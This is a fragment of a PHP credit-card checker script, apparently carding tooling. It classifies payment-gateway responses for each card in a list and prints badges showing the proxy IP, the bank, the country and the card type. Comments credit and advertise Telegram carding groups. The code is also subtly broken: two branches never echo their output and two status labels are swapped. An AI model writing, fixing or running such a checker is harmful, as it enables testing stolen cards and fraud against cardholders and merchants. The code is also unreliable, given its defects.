elseif(strpos($result3,"three_d_secure_redirect")){
     echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Doesnt Support Purchase_ Shaikh Rameez  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Card is declined by your bank, please contact them for additional confirmation.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「3D Secure Redirect_ Shaikh Rameez  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"missing_payment_confirmation")){
     '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Missing Payment confirmations_ Shaikh Rameez  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "Payment cannot be processed, missing credit card number")) {
     '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Missing Credit Card Number Shaikh Rameez  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Dead Proxy/Error Not listed Shaikh Rameez  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

//echo $result1;
//echo $result2;
//echo $result3;

///This Base Was Relased By @killuanew And edited by @HarryIsReborn0p
//Join @teamxcode @teamxcodechat 
//Find my 2req Base and index- @teamxcode here (Telegram)

?>
